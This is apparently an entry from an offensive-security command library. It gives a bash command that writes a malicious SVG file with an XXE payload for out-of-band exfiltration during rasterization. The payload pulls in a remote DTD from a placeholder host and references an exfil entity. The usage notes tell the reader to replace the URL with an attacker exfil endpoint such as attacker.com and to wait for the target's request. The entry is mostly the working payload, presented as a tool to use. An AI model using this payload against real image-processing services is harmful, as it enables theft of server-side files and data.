---
id: 560e660e-c145-432e-9c08-9cc081ace5b6
name: generate-svg-xxe-oob-rasterization
type: command
executor: bash
data: >-
  echo '<?xml version="1.0" standalone="yes"?>

  <!DOCTYPE svg [

  <!ELEMENT svg ANY >

  <!ENTITY % sp SYSTEM "http://example.org:8080/xxe.xml">

  %sp;

  %param1;

  ]>

  <svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg"
  style="fill:red">
        <text x="15" y="100" style="fill:black">XXE via SVG rasterization</text>
        <rect x="0" y="0" rx="10" ry="10" width="200" height="200" style="fill:pink;opacity:0.7"/>
        <flowRoot font-size="15">
           <flowRegion>
             <rect x="0" y="0" width="200" height="200" style="fill:red;opacity:0.3"/>
           </flowRegion>
           <flowDiv>
              <flowPara>&exfil;</flowPara>
           </flowDiv>
        </flowRoot>
  </svg>' > oob.svg
output: null
created_at: '2023-04-06T03:56:44.558969+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - xxe
  - svg
  - oob
  - generation
verified: true
validated: true
---

# generate-svg-xxe-oob-rasterization

## Command

```bash
echo '<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % sp SYSTEM "http://example.org:8080/xxe.xml">
%sp;
%param1;
]>
<svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
      <text x="15" y="100" style="fill:black">XXE via SVG rasterization</text>
      <rect x="0" y="0" rx="10" ry="10" width="200" height="200" style="fill:pink;opacity:0.7"/>
      <flowRoot font-size="15">
         <flowRegion>
           <rect x="0" y="0" width="200" height="200" style="fill:red;opacity:0.3"/>
         </flowRegion>
         <flowDiv>
            <flowPara>&exfil;</flowPara>
         </flowDiv>
      </flowRoot>
</svg>' > oob.svg
```

## Description

Generates an SVG file with an XXE payload designed for out-of-band exfiltration during SVG rasterization processing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| > oob.svg | Output file name | Yes |
| http://example.org:8080/xxe.xml | Remote DTD URL for OOB fetch | Yes (customize) |

## Examples

### Basic Usage

```bash
echo '<?xml ... >' > oob.svg
```

### Advanced Usage

Replace URL with your exfil endpoint, e.g., http://attacker.com/data.

## Expected Output

Creates oob.svg. Verify file creation; upon target processing, expect HTTP request to your server.

## Related

- [[procedures/XXE-Injection-via-SVG-Image]]
- [[codes/SVG-XXE-OOB-Exfiltration-via-Rasterization]]
